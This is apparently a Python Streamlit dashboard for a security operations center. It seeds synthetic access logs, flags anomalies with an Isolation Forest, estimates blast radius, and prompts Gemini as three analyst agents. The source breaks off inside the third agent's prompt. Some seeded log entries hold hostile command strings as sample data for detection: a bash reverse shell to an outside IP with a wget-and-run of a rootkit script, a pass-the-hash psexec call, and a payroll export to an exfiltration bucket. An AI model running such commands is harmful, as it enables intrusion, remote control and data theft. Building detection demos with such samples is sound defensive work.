import os
import json
import time
import datetime
import pandas as pd
import numpy as np
import requests
import streamlit as st
from sklearn.ensemble import IsolationForest

# ==========================================
# 0. API KEY CONFIGURATION & PERSISTENCE
# ==========================================
def get_persisted_gemini_key():
    """Retrieve Gemini API key from environment or local .env file."""
    if os.environ.get("GEMINI_API_KEY"):
        return os.environ.get("GEMINI_API_KEY").strip()
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    if os.path.exists(env_path):
        try:
            with open(env_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("GEMINI_API_KEY="):
                        return line.split("=", 1)[1].strip().strip('"').strip("'")
        except Exception:
            pass
    return ""

def save_gemini_key_to_env(key):
    """Save Gemini API key to local .env file."""
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    try:
        lines = []
        found = False
        if os.path.exists(env_path):
            with open(env_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
        new_lines = []
        for line in lines:
            if line.strip().startswith("GEMINI_API_KEY="):
                new_lines.append(f"GEMINI_API_KEY={key}\n")
                found = True
            else:
                new_lines.append(line)
        if not found:
            new_lines.append(f"GEMINI_API_KEY={key}\n")
        with open(env_path, "w", encoding="utf-8") as f:
            f.writelines(new_lines)
        return True
    except Exception:
        return False

INITIAL_GEMINI_KEY = get_persisted_gemini_key()

# ==========================================
# 1. PAGE CONFIG & CYBERPUNK SOC STYLING
# ==========================================
st.set_page_config(
    page_title="CyberSentinel: AutoSOC",
    page_icon=None,
    layout="wide",
    initial_sidebar_state="expanded"
)

# High-contrast Cyberpunk / Dark SOC CSS
CUSTOM_CSS = """
<style>
    /* Main Background and Text */
    .stApp {
        background-color: #0a0e17;
        color: #e2e8f0;
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }
    
    /* Headers & Accent Text */
    h1, h2, h3, h4, h5, h6 {
        color: #00f0ff !important;
        font-weight: 700;
        letter-spacing: 0.5px;
    }
    
    /* Sidebar Styling */
    section[data-testid="stSidebar"] {
        background-color: #0d1322 !important;
        border-right: 1px solid #1e293b;
    }
    
    /* Tabs Styling */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        background-color: #0d1322;
        padding: 8px 12px;
        border-radius: 8px;
        border: 1px solid #1e293b;
    }

    .stTabs [data-baseweb="tab"] {
        height: 42px;
        border-radius: 6px;
        color: #94a3b8;
        font-weight: 600;
        padding: 0 16px;
        background-color: #121826;
        border: 1px solid transparent;
    }

    .stTabs [aria-selected="true"] {
        background-color: #1e293b !important;
        color: #00f0ff !important;
        border: 1px solid #00f0ff !important;
    }
    
    /* Metric Cards */
    div[data-testid="stMetricValue"] {
        font-size: 1.6rem !important;
        color: #00f0ff !important;
        font-weight: 800;
    }
    
    div[data-testid="stMetric"] {
        background-color: #121826;
        border: 1px solid #1e293b;
        border-radius: 8px;
        padding: 12px 16px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    
    /* Custom SOC Cards */
    .soc-card {
        background: #121826;
        border: 1px solid #1e293b;
        border-radius: 10px;
        padding: 16px;
        margin-bottom: 16px;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
    }
    
    .soc-card-red {
        background: rgba(255, 0, 60, 0.05);
        border: 1px solid #ff003c;
        border-radius: 10px;
        padding: 16px;
        margin-bottom: 16px;
        box-shadow: 0 0 15px rgba(255, 0, 60, 0.2);
    }
    
    .soc-card-blue {
        background: rgba(0, 150, 255, 0.05);
        border: 1px solid #0096ff;
        border-radius: 10px;
        padding: 16px;
        margin-bottom: 16px;
        box-shadow: 0 0 15px rgba(0, 150, 255, 0.2);
    }
    
    .soc-card-gold {
        background: rgba(255, 191, 0, 0.05);
        border: 1px solid #ffbf00;
        border-radius: 10px;
        padding: 16px;
        margin-bottom: 16px;
        box-shadow: 0 0 15px rgba(255, 191, 0, 0.2);
    }
    
    /* Badges */
    .badge-critical {
        background-color: #ff003c;
        color: #ffffff;
        padding: 4px 10px;
        border-radius: 4px;
        font-weight: 700;
        font-size: 0.75rem;
        letter-spacing: 1px;
    }
    
    .badge-normal {
        background-color: #00ff66;
        color: #0a0e17;
        padding: 4px 10px;
        border-radius: 4px;
        font-weight: 700;
        font-size: 0.75rem;
        letter-spacing: 1px;
    }

    .badge-info {
        background-color: #00f0ff;
        color: #0a0e17;
        padding: 4px 10px;
        border-radius: 4px;
        font-weight: 700;
        font-size: 0.75rem;
    }
    
    /* Terminal Console */
    .terminal-container {
        background-color: #050811;
        border: 1px solid #00ff66;
        border-radius: 8px;
        padding: 14px;
        font-family: 'Fira Code', 'Courier New', monospace;
        color: #00ff66;
        font-size: 0.88rem;
        box-shadow: 0 0 20px rgba(0, 255, 102, 0.15);
    }

    .terminal-prompt {
        color: #00f0ff;
        font-weight: bold;
    }

    .terminal-output {
        color: #cbd5e1;
        white-space: pre-wrap;
        margin-top: 4px;
        margin-bottom: 8px;
    }

    /* Buttons Override */
    .stButton>button {
        border-radius: 6px;
        font-weight: 600;
        transition: all 0.2s ease-in-out;
    }
    
    /* Table Styling */
    div[data-testid="stDataFrame"] {
        background-color: #121826;
        border: 1px solid #1e293b;
        border-radius: 8px;
    }
</style>
"""
st.markdown(CUSTOM_CSS, unsafe_allow_html=True)


# ==========================================
# 2. DATA LOADERS & INITIALIZATION
# ==========================================
LOGS_FILE = "logs.txt"
INFRA_FILE = "infrastructure_graph.json"

def init_files():
    """Ensure logs.txt and infrastructure_graph.json exist."""
    if not os.path.exists(INFRA_FILE):
        infra_data = {
            "nodes": {
                "AUTH-SRV-AD": {
                    "name": "Active Directory Core Controller",
                    "criticality": "CATASTROPHIC",
                    "criticality_weight": 10,
                    "downtime_cost_per_hr": 50000,
                    "depends_on": [],
                    "description": "Enterprise Authentication & Domain Controller"
                },
                "DB-PAYROLL-01": {
                    "name": "Payroll Database Server",
                    "criticality": "HIGH",
                    "criticality_weight": 8,
                    "downtime_cost_per_hr": 18500,
                    "depends_on": ["AUTH-SRV-AD"],
                    "description": "Sensitive Employee Compensation Database"
                },
                "DB-CUSTOMER-02": {
                    "name": "Customer Production Database",
                    "criticality": "HIGH",
                    "criticality_weight": 8,
                    "downtime_cost_per_hr": 25000,
                    "depends_on": ["AUTH-SRV-AD"],
                    "description": "Primary Customer Relational Database Cluster"
                },
                "WEB-PROD-CLUSTER": {
                    "name": "Production Web App Cluster",
                    "criticality": "MAJOR",
                    "criticality_weight": 7,
                    "downtime_cost_per_hr": 12000,
                    "depends_on": ["DB-CUSTOMER-02", "AUTH-SRV-AD"],
                    "description": "Public Customer E-Commerce Facing Frontend"
                },
                "S3-CUSTOMER-BACKUP": {
                    "name": "Customer Backup Object Storage",
                    "criticality": "MODERATE",
                    "criticality_weight": 5,
                    "downtime_cost_per_hr": 5000,
                    "depends_on": [],
                    "description": "Encrypted Offsite Storage Backups"
                },
                "FIN-APP-SERVER": {
                    "name": "Finance Enterprise Application",
                    "criticality": "HIGH",
                    "criticality_weight": 8,
                    "downtime_cost_per_hr": 15000,
                    "depends_on": ["DB-PAYROLL-01", "AUTH-SRV-AD"],
                    "description": "Internal Enterprise ERP & Payroll App"
                },
                "DEV-SANDBOX-09": {
                    "name": "Developer Sandbox Instance",
                    "criticality": "LOW",
                    "criticality_weight": 2,
                    "downtime_cost_per_hr": 0,
                    "depends_on": [],
                    "description": "Isolated Testing Environment"
                }
            }
        }
        with open(INFRA_FILE, "w") as f:
            json.dump(infra_data, f, indent=2)

    if not os.path.exists(LOGS_FILE):
        logs = [
            {"timestamp": "2026-08-25T08:15:22Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "DEV-SANDBOX-09", "event_type": "SSH_LOGIN", "login_hour": 8, "data_volume_mb": 4.2, "failed_attempts": 0, "payload_signature": "ssh developer@dev-sandbox-09"},
            {"timestamp": "2026-08-25T08:20:11Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "DEV-SANDBOX-09", "event_type": "FILE_ACCESS", "login_hour": 8, "data_volume_mb": 12.5, "failed_attempts": 0, "payload_signature": "cat /var/log/application.log"},
            {"timestamp": "2026-08-25T08:45:00Z", "employee_id": "EMP_4021 (Finance)", "source_ip": "10.0.1.55", "target_system": "FIN-APP-SERVER", "event_type": "DB_QUERY", "login_hour": 8, "data_volume_mb": 18.1, "failed_attempts": 0, "payload_signature": "SELECT invoice_id, amount FROM Q3_reports WHERE status='approved';"},
            {"timestamp": "2026-08-25T09:05:34Z", "employee_id": "EMP_3310 (HR)", "source_ip": "10.0.1.80", "target_system": "DB-PAYROLL-01", "event_type": "DB_QUERY", "login_hour": 9, "data_volume_mb": 2.8, "failed_attempts": 0, "payload_signature": "SELECT name, dept FROM employees WHERE status='active';"},
            {"timestamp": "2026-08-25T09:30:19Z", "employee_id": "EMP_1105 (Marketing)", "source_ip": "10.0.3.22", "target_system": "S3-CUSTOMER-BACKUP", "event_type": "FILE_ACCESS", "login_hour": 9, "data_volume_mb": 45.0, "failed_attempts": 0, "payload_signature": "aws s3 cp s3://customer-assets/logo-pack.zip ."},
            {"timestamp": "2026-08-25T10:12:44Z", "employee_id": "EMP_7741 (DevOps)", "source_ip": "10.0.4.12", "target_system": "WEB-PROD-CLUSTER", "event_type": "API_CALL", "login_hour": 10, "data_volume_mb": 8.4, "failed_attempts": 0, "payload_signature": "kubectl get pods -n production"},
            {"timestamp": "2026-08-25T10:45:10Z", "employee_id": "EMP_4021 (Finance)", "source_ip": "10.0.1.55", "target_system": "FIN-APP-SERVER", "event_type": "DB_QUERY", "login_hour": 10, "data_volume_mb": 5.1, "failed_attempts": 0, "payload_signature": "UPDATE quarterly_budget SET allocated=50000 WHERE dept='IT';"},
            {"timestamp": "2026-08-25T11:20:00Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "DEV-SANDBOX-09", "event_type": "SSH_LOGIN", "login_hour": 11, "data_volume_mb": 1.1, "failed_attempts": 1, "payload_signature": "git pull origin main"},
            {"timestamp": "2026-08-25T12:00:15Z", "employee_id": "EMP_5520 (Sales)", "source_ip": "10.0.3.90", "target_system": "DB-CUSTOMER-02", "event_type": "DB_QUERY", "login_hour": 12, "data_volume_mb": 33.6, "failed_attempts": 0, "payload_signature": "SELECT lead_name, contact_email FROM crm_leads LIMIT 500;"},
            {"timestamp": "2026-08-25T13:10:05Z", "employee_id": "EMP_7741 (DevOps)", "source_ip": "10.0.4.12", "target_system": "AUTH-SRV-AD", "event_type": "SSH_LOGIN", "login_hour": 13, "data_volume_mb": 0.8, "failed_attempts": 0, "payload_signature": "ssh admin@auth-srv-ad.corp.internal"},
            {"timestamp": "2026-08-25T03:02:18Z", "employee_id": "EMP_UNKNOWN (Adversary)", "source_ip": "185.220.101.5", "target_system": "AUTH-SRV-AD", "event_type": "PRIVILEGE_ESCALATION", "login_hour": 3, "data_volume_mb": 850.5, "failed_attempts": 47, "payload_signature": "ldapsearch -x -h AUTH-SRV-AD -b 'dc=corp,dc=internal' '(objectClass=*)' && psexec.py administrator@10.0.0.5 -hashes :31d6cf0d47a441e00000000000000000"},
            {"timestamp": "2026-08-25T14:15:33Z", "employee_id": "EMP_3310 (HR)", "source_ip": "10.0.1.80", "target_system": "DB-PAYROLL-01", "event_type": "DB_QUERY", "login_hour": 14, "data_volume_mb": 3.9, "failed_attempts": 0, "payload_signature": "SELECT emp_id, salary_grade FROM salary_bands;"},
            {"timestamp": "2026-08-25T14:45:20Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "WEB-PROD-CLUSTER", "event_type": "API_CALL", "login_hour": 14, "data_volume_mb": 14.0, "failed_attempts": 0, "payload_signature": "curl -X GET https://api.corp.internal/v1/health"},
            {"timestamp": "2026-08-25T15:22:11Z", "employee_id": "EMP_1105 (Marketing)", "source_ip": "10.0.3.22", "target_system": "S3-CUSTOMER-BACKUP", "event_type": "FILE_ACCESS", "login_hour": 15, "data_volume_mb": 12.0, "failed_attempts": 0, "payload_signature": "aws s3 ls s3://customer-assets/campaigns/"},
            {"timestamp": "2026-08-25T02:14:50Z", "employee_id": "EMP_1105 (Marketing)", "source_ip": "194.26.29.110", "target_system": "DB-PAYROLL-01", "event_type": "BULK_EXPORT", "login_hour": 2, "data_volume_mb": 14580.5, "failed_attempts": 8, "payload_signature": "SELECT * FROM payroll_records; COPY TO 's3://external-exfil-bucket/data.tar.gz' WITH BINARY;"},
            {"timestamp": "2026-08-25T16:05:40Z", "employee_id": "EMP_4021 (Finance)", "source_ip": "10.0.1.55", "target_system": "FIN-APP-SERVER", "event_type": "DB_QUERY", "login_hour": 16, "data_volume_mb": 22.1, "failed_attempts": 0, "payload_signature": "SELECT tax_summary FROM annual_audit_2026;"},
            {"timestamp": "2026-08-25T16:30:15Z", "employee_id": "EMP_7741 (DevOps)", "source_ip": "10.0.4.12", "target_system": "WEB-PROD-CLUSTER", "event_type": "SSH_LOGIN", "login_hour": 16, "data_volume_mb": 5.4, "failed_attempts": 0, "payload_signature": "systemctl status nginx"},
            {"timestamp": "2026-08-25T17:10:00Z", "employee_id": "EMP_5520 (Sales)", "source_ip": "10.0.3.90", "target_system": "DB-CUSTOMER-02", "event_type": "DB_QUERY", "login_hour": 17, "data_volume_mb": 19.3, "failed_attempts": 0, "payload_signature": "SELECT deal_stage, revenue FROM pipeline_2026;"},
            {"timestamp": "2026-08-25T01:45:12Z", "employee_id": "EMP_UNKNOWN (External Attacker)", "source_ip": "45.154.255.88", "target_system": "WEB-PROD-CLUSTER", "event_type": "REVERSE_SHELL", "login_hour": 1, "data_volume_mb": 820.0, "failed_attempts": 12, "payload_signature": "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1; wget http://malicious.cnc/rootkit.sh -O /tmp/k.sh && chmod +x /tmp/k.sh && ./tmp/k.sh"},
            {"timestamp": "2026-08-25T18:00:25Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "DEV-SANDBOX-09", "event_type": "FILE_ACCESS", "login_hour": 18, "data_volume_mb": 3.1, "failed_attempts": 0, "payload_signature": "npm run build"},
            {"timestamp": "2026-08-25T18:30:00Z", "employee_id": "EMP_3310 (HR)", "source_ip": "10.0.1.80", "target_system": "AUTH-SRV-AD", "event_type": "SSH_LOGIN", "login_hour": 18, "data_volume_mb": 0.4, "failed_attempts": 0, "payload_signature": "passwd --status emp_3310"},
            {"timestamp": "2026-08-25T19:05:10Z", "employee_id": "EMP_7741 (DevOps)", "source_ip": "10.0.4.12", "target_system": "S3-CUSTOMER-BACKUP", "event_type": "FILE_ACCESS", "login_hour": 19, "data_volume_mb": 88.0, "failed_attempts": 0, "payload_signature": "aws s3 sync s3://customer-backups/daily/ /mnt/backup_verify/"},
            {"timestamp": "2026-08-25T19:40:45Z", "employee_id": "EMP_4021 (Finance)", "source_ip": "10.0.1.55", "target_system": "FIN-APP-SERVER", "event_type": "DB_QUERY", "login_hour": 19, "data_volume_mb": 9.5, "failed_attempts": 0, "payload_signature": "SELECT audit_log FROM transactions WHERE date=CURRENT_DATE;"},
            {"timestamp": "2026-08-25T20:15:30Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "DEV-SANDBOX-09", "event_type": "SSH_LOGIN", "login_hour": 20, "data_volume_mb": 2.2, "failed_attempts": 0, "payload_signature": "docker ps -a"},
            {"timestamp": "2026-08-25T20:50:00Z", "employee_id": "EMP_5520 (Sales)", "source_ip": "10.0.3.90", "target_system": "DB-CUSTOMER-02", "event_type": "DB_QUERY", "login_hour": 20, "data_volume_mb": 15.0, "failed_attempts": 0, "payload_signature": "SELECT customer_name, subscription_tier FROM active_accounts;"},
            {"timestamp": "2026-08-25T21:10:12Z", "employee_id": "EMP_7741 (DevOps)", "source_ip": "10.0.4.12", "target_system": "WEB-PROD-CLUSTER", "event_type": "API_CALL", "login_hour": 21, "data_volume_mb": 6.8, "failed_attempts": 0, "payload_signature": "curl http://10.0.4.12:8080/metrics"},
            {"timestamp": "2026-08-25T21:45:55Z", "employee_id": "EMP_3310 (HR)", "source_ip": "10.0.1.80", "target_system": "DB-PAYROLL-01", "event_type": "DB_QUERY", "login_hour": 21, "data_volume_mb": 1.5, "failed_attempts": 0, "payload_signature": "SELECT count(*) FROM employee_onboarding;"},
            {"timestamp": "2026-08-25T22:15:20Z", "employee_id": "EMP_1105 (Marketing)", "source_ip": "10.0.3.22", "target_system": "S3-CUSTOMER-BACKUP", "event_type": "FILE_ACCESS", "login_hour": 22, "data_volume_mb": 3.4, "failed_attempts": 0, "payload_signature": "aws s3 ls s3://marketing-media/2026/"},
            {"timestamp": "2026-08-25T22:50:05Z", "employee_id": "EMP_9102 (Engineering)", "source_ip": "10.0.2.14", "target_system": "DEV-SANDBOX-09", "event_type": "SSH_LOGIN", "login_hour": 22, "data_volume_mb": 0.9, "failed_attempts": 0, "payload_signature": "exit"},
            {"timestamp": "2026-08-25T23:30:00Z", "employee_id": "EMP_7741 (DevOps)", "source_ip": "10.0.4.12", "target_system": "AUTH-SRV-AD", "event_type": "FILE_ACCESS", "login_hour": 23, "data_volume_mb": 2.0, "failed_attempts": 0, "payload_signature": "tail -n 100 /var/log/auth.log"}
        ]
        with open(LOGS_FILE, "w") as f:
            for l in logs:
                f.write(json.dumps(l) + "\n")

init_files()

@st.cache_data
def load_infrastructure():
    with open(INFRA_FILE, "r") as f:
        return json.load(f)["nodes"]

@st.cache_data
def load_all_logs():
    logs = []
    with open(LOGS_FILE, "r") as f:
        for line in f:
            if line.strip():
                logs.append(json.loads(line))
    return logs

INFRA_GRAPH = load_infrastructure()
ALL_LOGS = load_all_logs()


# ==========================================
# 3. UEBA ISOLATION FOREST ANOMALY ENGINE
# ==========================================
@st.cache_resource
def train_ueba_model(contamination=0.15):
    """Train Isolation Forest on baseline behavioral features."""
    df = pd.DataFrame(ALL_LOGS)
    features = ['login_hour', 'data_volume_mb', 'failed_attempts']
    X = df[features].values
    
    model = IsolationForest(contamination=contamination, random_state=42)
    model.fit(X)
    return model

def analyze_log_ueba(log_record, model):
    """Extract features & predict anomaly score."""
    features = np.array([[
        log_record['login_hour'],
        log_record['data_volume_mb'],
        log_record['failed_attempts']
    ]])
    
    pred = model.predict(features)[0] # -1 for anomaly, 1 for normal
    score = model.decision_function(features)[0]
    
    anomaly_probability = max(0, min(100, int((0.2 - score) * 150))) if pred == -1 else max(0, int((score) * 100))
    is_anomaly = (pred == -1)
    
    return is_anomaly, anomaly_probability, score


# ==========================================
# 4. BLAST RADIUS MATHEMATICAL CALCULATOR
# ==========================================
def calculate_blast_radius(target_system, infra_graph):
    """Calculate blast risk score and downstream financial impact."""
    if target_system not in infra_graph:
        return {
            "criticality": "LOW",
            "criticality_weight": 2,
            "downstream_nodes": [],
            "direct_downtime_cost": 0,
            "total_downstream_downtime_cost": 0,
            "total_financial_exposure_per_hr": 0,
            "blast_score": 10.0,
            "blast_tier": "ISOLATED"
        }
    
    target_info = infra_graph[target_system]
    crit_weight_map = {"CATASTROPHIC": 10, "HIGH": 8, "MAJOR": 7, "MODERATE": 5, "LOW": 2}
    crit_weight = crit_weight_map.get(target_info.get("criticality", "LOW"), 3)
    
    downstream_nodes = []
    total_downstream_cost = 0
    
    for node_id, node_data in infra_graph.items():
        if target_system in node_data.get("depends_on", []):
            downstream_nodes.append(node_id)
            total_downstream_cost += node_data.get("downtime_cost_per_hr", 0)
            
    direct_cost = target_info.get("downtime_cost_per_hr", 0)
    total_exposure = direct_cost + total_downstream_cost
    
    blast_score = round((crit_weight * 5.0) + (total_exposure / 3000.0), 1)
    blast_score = min(100.0, max(5.0, blast_score))
    
    if blast_score >= 70 or target_info.get("criticality") == "CATASTROPHIC":
        blast_tier = "CATASTROPHIC"
    elif blast_score >= 45:
        blast_tier = "MAJOR"
    elif blast_score >= 25:
        blast_tier = "MODERATE"
    else:
        blast_tier = "ISOLATED"
        
    return {
        "criticality": target_info.get("criticality", "LOW"),
        "criticality_weight": crit_weight,
        "downstream_nodes": downstream_nodes,
        "direct_downtime_cost": direct_cost,
        "total_downstream_downtime_cost": total_downstream_cost,
        "total_financial_exposure_per_hr": total_exposure,
        "blast_score": blast_score,
        "blast_tier": blast_tier
    }


# ==========================================
# 5. DETERMINISTIC OFFLINE HEURISTIC AGENTS
# ==========================================
def get_deterministic_agent_analysis(log_record, blast_info):
    """Fallback 3-Agent Response Generator when offline or LLM API is unavailable."""
    target = log_record.get("target_system", "UNKNOWN")
    event_type = log_record.get("event_type", "ANOMALY")
    payload = log_record.get("payload_signature", "")
    employee = log_record.get("employee_id", "EMP_UNKNOWN")
    
    if "PRIVILEGE_ESCALATION" in event_type or "AUTH-SRV-AD" in target:
        agent1_resp = {
            "threat_tactic": "Credential Access & Lateral Movement (MITRE T1078, T1021)",
            "severity": "CRITICAL",
            "attacker_intent": "Active credential stuffing attack targeting Active Directory. Adversary is attempting NTLM hash injection (psexec) to gain domain controller root dominance.",
            "evidence_breakdown": [
                f"{log_record.get('failed_attempts', 47)} failed authentications in short window",
                f"Off-hours anomaly at {log_record.get('login_hour', 3)}:00 AM",
                f"Payload signature: '{payload[:60]}...'",
                f"High severity IP signature: {log_record.get('source_ip')}"
            ]
        }
    elif "BULK_EXPORT" in event_type or "DB-PAYROLL-01" in target:
        agent1_resp = {
            "threat_tactic": "Exfiltration & Data Abuse (MITRE T1048, T1567)",
            "severity": "HIGH",
            "attacker_intent": f"Mass data exfiltration attempt from sensitive payroll database via low-privilege marketing account ({employee}).",
            "evidence_breakdown": [
                f"Abnormal data transfer volume: {log_record.get('data_volume_mb')} MB",
                "Unusual query payload requesting entire payroll table export",
                f"Unusual login hour ({log_record.get('login_hour')}:00 AM) from external IP {log_record.get('source_ip')}"
            ]
        }
    elif "REVERSE_SHELL" in event_type or "WEB-PROD-CLUSTER" in target:
        agent1_resp = {
            "threat_tactic": "Command & Control / Execution (MITRE T1059.004, T1071)",
            "severity": "CRITICAL",
            "attacker_intent": "Interactive reverse bash shell established on public web application server to download secondary malicious ELF payloads.",
            "evidence_breakdown": [
                f"Direct socket redirect signature detected: {payload[:65]}...",
                "Outbound connection attempt to known suspicious C2 IP",
                "Execution of unverified shell execution script in /tmp directory"
            ]
        }
    else:
        agent1_resp = {
            "threat_tactic": "Unusual Behavioral Anomaly (MITRE T1078)",
            "severity": "MEDIUM",
            "attacker_intent": "Deviating employee behavioral pattern matching potential compromised account activity.",
            "evidence_breakdown": [
                f"Data volume spike: {log_record.get('data_volume_mb')} MB",
                f"Failed login attempt count: {log_record.get('failed_attempts')}",
                f"Event type: {event_type}"
            ]
        }

    downstream_str = ", ".join(blast_info['downstream_nodes']) if blast_info['downstream_nodes'] else "None (Isolated Node)"
    agent2_resp = {
        "target_system": target,
        "criticality": blast_info['criticality'],
        "downstream_impacted_services": blast_info['downstream_nodes'],
        "downtime_cost_per_hr": blast_info['direct_downtime_cost'],
        "total_financial_exposure_per_hr": blast_info['total_financial_exposure_per_hr'],
        "blast_radius_tier": blast_info['blast_tier'],
        "business_risk_summary": f"Immediate termination of {target} will impact {len(blast_info['downstream_nodes'])} downstream services ({downstream_str}), incurring an estimated downtime cost of ${blast_info['total_financial_exposure_per_hr']:,}/hr."
    }

    if blast_info['blast_tier'] in ["CATASTROPHIC", "MAJOR"] or blast_info['total_financial_exposure_per_hr'] > 30000:
        agent3_resp = {
            "final_recommendation": "Dynamic Honeypot Redirection",
            "confidence_score": 95,
            "trade_off_resolution": f"Directly isolating {target} causes unacceptable operational collateral damage (${blast_info['total_financial_exposure_per_hr']:,}/hr). Rerouting adversary IP {log_record.get('source_ip')} to the Dynamic Honey-Agent tarpit isolates the threat without interrupting core services.",
            "action_plan": [
                f"1. Inject firewall tarpit rule mapping {log_record.get('source_ip')} to Decoy Honey-Shell.",
                f"2. Trigger mandatory step-up authentication on {employee} credentials.",
                f"3. Capture adversary commands live in honeypot playbook for threat intelligence."
            ]
        }
    else:
        agent3_resp = {
            "final_recommendation": "Targeted Containment",
            "confidence_score": 92,
            "trade_off_resolution": f"Target server {target} has minimal downstream dependencies (${blast_info['total_financial_exposure_per_hr']:,}/hr). Instant isolation eliminates security exposure with near-zero business impact.",
            "action_plan": [
                f"1. Isolate network interface for {target}.",
                f"2. Revoke active access token for {employee}.",
                f"3. Dispatch incident response ticket to SecOps tier-2."
            ]
        }

    return agent1_resp, agent2_resp, agent3_resp


@st.cache_data(ttl=30)
def check_api_health(key, model="gemini-1.5-flash"):
    """Check live connectivity to Google Gemini API."""
    if not key or not key.strip() or key.strip().startswith("AQ."):
        return False, "No valid API key provided. Please input your Gemini API Key."
    
    url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key.strip()}"
    try:
        resp = requests.post(
            url,
            headers={"Content-Type": "application/json"},
            json={"contents": [{"parts": [{"text": "Reply with 'OK'"}]}]},
            timeout=6
        )
        if resp.status_code == 200:
            return True, f"ONLINE ({model} Active)"
        else:
            try:
                err_json = resp.json()
                msg = err_json.get("error", {}).get("message", f"HTTP {resp.status_code}")
            except Exception:
                msg = f"HTTP {resp.status_code}: {resp.text[:100]}"
            return False, msg
    except Exception as e:
        return False, f"Connection error: {str(e)}"


# ==========================================
# 6. INTEGRATED GEMINI MULTI-AGENT PROMPTING
# ==========================================
def clean_llm_json(raw_text):
    """Strip markdown code fence blocks if returned by LLM."""
    text = raw_text.strip()
    if text.startswith("```json"):
        text = text[7:]
    elif text.startswith("```"):
        text = text[3:]
    if text.endswith("```"):
        text = text[:-3]
    return text.strip()


def call_gemini_api(prompt, api_key, primary_model="gemini-1.5-flash"):
    """Live Gemini API dispatcher sending bugs/events to active model with fallbacks."""
    key = api_key.strip() if api_key else ""
    if not key or key.startswith("AQ."):
        raise ValueError("Missing or invalid Gemini API key. Please enter a valid key in the sidebar.")

    headers = {"Content-Type": "application/json"}
    payload = {
        "contents": [{"parts": [{"text": prompt + "\n\nCRITICAL: Respond ONLY with valid raw JSON object matching the requested schema. Do not include markdown fences or commentary."}]}],
        "generationConfig": {"temperature": 0.2, "responseMimeType": "application/json"}
    }
    
    # Try primary model first, followed by alternates
    candidates = [primary_model]
    for alt in ["gemini-1.5-flash", "gemini-2.0-flash", "gemini-1.5-pro"]:
        if alt not in candidates:
            candidates.append(alt)
            
    last_err = None
    for model in candidates:
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={key}"
        try:
            resp = requests.post(url, headers=headers, json=payload, timeout=14)
            if resp.status_code == 200:
                res_data = resp.json()
                parts = res_data.get('candidates', [{}])[0].get('content', {}).get('parts', [{}])
                raw_text = parts[0].get('text', '{}')
                cleaned = clean_llm_json(raw_text)
                return json.loads(cleaned)
            else:
                try:
                    err_msg = resp.json().get("error", {}).get("message", resp.text)
                except Exception:
                    err_msg = resp.text
                last_err = f"{model} returned HTTP {resp.status_code}: {err_msg}"
        except Exception as e:
            last_err = f"{model} exception: {str(e)}"

    raise Exception(f"Gemini API Error across models: {last_err}")


def run_3_agent_debate(log_record, blast_info, api_key="", model="gemini-1.5-flash", allow_fallback=False):
    """Run 3-Agent debate pipeline by actually sending security incident/bug logs to Gemini API."""
    key = api_key.strip() if api_key else ""
    if not key or key.startswith("AQ."):
        if allow_fallback:
            ag1, ag2, ag3 = get_deterministic_agent_analysis(log_record, blast_info)
            return ag1, ag2, ag3, False, "No Gemini API key provided. Using local offline fallback."
        return None, None, None, False, "No Gemini API key provided. Please input your Gemini API Key in the left sidebar to analyze this event live."

    try:
        p1 = f"""You are CyberSentinel Agent 1 (Threat Hunter SecOps Specialist). Analyze this anomalous security event / bug telemetry:
{json.dumps(log_record, indent=2)}

Examine the payload_signature, event_type, source_ip, data volume, and timestamps carefully.
Output strictly JSON matching this structure:
{{
  "threat_tactic": "string (MITRE Tactic name & ATT&CK ID e.g. T1078, T1059)",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "attacker_intent": "detailed technical explanation of attacker intention, methodology, and payload actions",
  "evidence_breakdown": ["specific evidence point 1 extracted from log", "specific evidence point 2", "specific evidence point 3"]
}}"""
        ag1 = call_gemini_api(p1, key, primary_model=model)

        p2 = f"""You are CyberSentinel Agent 2 (Blast Radius Specialist). Given this target system log:
{json.dumps(log_record, indent=2)}
And Infrastructure Context:
Target: {blast_info['criticality']}, Direct Downtime Cost: ${blast_info['direct_downtime_cost']}/hr, Downstream Nodes: {blast_info['downstream_nodes']}, Total Financial Exposure: ${blast_info['total_financial_exposure_per_hr']}/hr

Output strictly JSON matching:
{{
  "target_system": "{log_record.get('target_system')}",
  "criticality": "{blast_info['criticality']}",
  "downstream_impacted_services": {json.dumps(blast_info['downstream_nodes'])},
  "downtime_cost_per_hr": {blast_info['direct_downtime_cost']},
  "total_financial_exposure_per_hr": {blast_info['total_financial_exposure_per_hr']},
  "blast_radius_tier": "{blast_info['blast_tier']}",
  "business_risk_summary": "detailed assessment of downstream business, compliance, and revenue risk if this server is shut down vs kept alive"
}}"""
        ag2 = call_gemini_api(p2, key, primary_model=model)

        p3 = f"""You are CyberSentinel Agent 3 (Incident Commander Arbiter). Review Agent 1 Threat findings:
{json.dumps(ag1, indent=2)}
And Agent 2 Infrastructure Blast findings:
{json.dumps(ag2, indent=2)}

Resolve the trade-off between immediate security containment and collateral business downtime. Choose recommendation: 'Targeted Containment', 'Dynamic Honeypot Redirection', or 'Continuous Observation'.

Output strictly JSON:
{{
  "final_recommendation": "Targeted Containment | Dynamic Honeypot Redirection | Continuous Observation",
  "confidence_score": integer (0-100),
  "trade_off_resolution": "detailed justification explaining how business uptime was balanced against adversary dwell time",
  "action_plan": ["step 1 for SecOps / NetOps", "step 2", "step 3"]
}}"""
